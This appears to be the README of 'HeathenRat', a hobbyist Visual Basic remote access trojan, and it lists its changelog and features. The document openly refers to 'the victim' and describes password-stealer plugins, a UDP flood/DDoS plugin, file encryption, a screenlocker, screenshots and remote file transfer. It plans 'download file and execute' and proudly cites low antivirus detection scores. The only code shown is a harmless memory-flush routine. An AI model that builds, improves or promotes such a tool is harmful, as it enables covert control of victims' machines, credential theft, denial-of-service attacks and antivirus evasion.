This rat works with tcp client and server ! I don't take any responsabilites for misusage of this Remote Access Tool , you're  responsible for your acts ! ! I used some different libraries (for example the Passwords Plugin) and all what I re-used in my code is linked in commentaries ! Simple but powerful !( I inspired by src from https://www.youtube.com/watch?v=UWJja8Qp65Y&t and https://www.youtube.com/watch?v=UytjOcSHje8 )




Currently in developement , be patient I work alone


All my friends are heathens , take it slow 

RBBRat = Stub 

Client = GUI Server

YOU NEED BUNIFU , XANDERUI 





What will be added next time ?

* -download file and execute (computer and memory)
* -use File Manager to edit txt file and download file from victim
* -...

NOTE : Currently developing a derivative of this rat (like console) so the command center will not be often udapte in this version. Also the stub will be nearly the same in Console Rat (will release soon) and HeathenRat. Also searching for a good lib to make passwords stealer after this shitty chrome update.

LAST UPDATE FROM  19-02-2020 21:32 :

* -Added Upload option to file manager
* -Added Download option to file manager
* -Improved reconnect event (known minor bugs)
* -Small changes with the UI
* -Added dependencies in a folder with same name 
* -Added SwapMouse Buttons Functions
* -Added DoubleClic event in File Manager to go on in folders
* -Clear Ram after using plugin 

```Visual Basic 
    ''Come from : https://www.youtube.com/watch?v=-fPY7ecWPUA
    ''Reset Cache Memory
    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
    Public Sub FlushMemory()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
                Dim myProcesses As Process() = Process.GetProcessesByName("ApplicationName")
                Dim myProcess As Process
                'Dim ProcessInfo As Process
                For Each myProcess In myProcesses
                    SetProcessWorkingSetSize(myProcess.Handle, -1, -1)
                Next myProcess
            End If
        Catch ex As Exception
        End Try
    End Sub

    ''https://www.youtube.com/watch?v=-fPY7ecWPUA
```


LAST UPDATE FROM 17-02-2020 22:42 :

* -Client try to reconnect to server until they can (reconnect event)
* -File Manager can encrypt and decrypt files with XXtea encryption (see the commentaries in stub to find the link or search Xxtea dotnet)
* -Corrected Minor Bugs


LAST UPDATE FROM 06-02-2020 22:59 :

* -added commands in command center (FM and disconnect)
* -added some native functions ("block screen with invisble window" , "start random cursor postion" )
* -added reconnect event if connection lost (client side) or server closed
* -improved file manager



LAST UPDATE 26-01-2020 20:31 :

* -corrected bugs with file manager
* -added funny audio + meme sounds
* -command center improved
* -minor bugs corrected
* -added icons
* -added commentaries and removed unnecessary commentaries
* -removed some useless code for now

LAST UPDATE 25-01-20 20:55 :

* -fixed bugs client not try to reconnect to server after those closes
* -added screenlocker
* -added screenshot
* -added UDP Flood
* -added change wallpaper 
* -added taskmanager (can kill task actually don't use refresh feature it is broken for now)
* -removed garbage dll and codes
* -added commentaries to understand
* -added src of DDOS plugin + PW plugins (the 2)


NOTE : 
-LET DDOS.dll next to Heathen Rat , it's a plugin to show you how can work a plugin
-I put code of small plugin inside my client (like change wallpaper) and won't move it to build a plugin


Result : 

- https://www.kleenscan.com/scan_result/7030f60e8d1e7e0f47b92a9a328cd167  3/32   -21-01-2020

- https://virusscan.jotti.org/fr-FR/filescanjob/75o10gp4b8 2/15  -21-01-2020

- https://cyberscan.org/results.php?id=JAl0C4STDY 1 / 24  -21-01-2020 
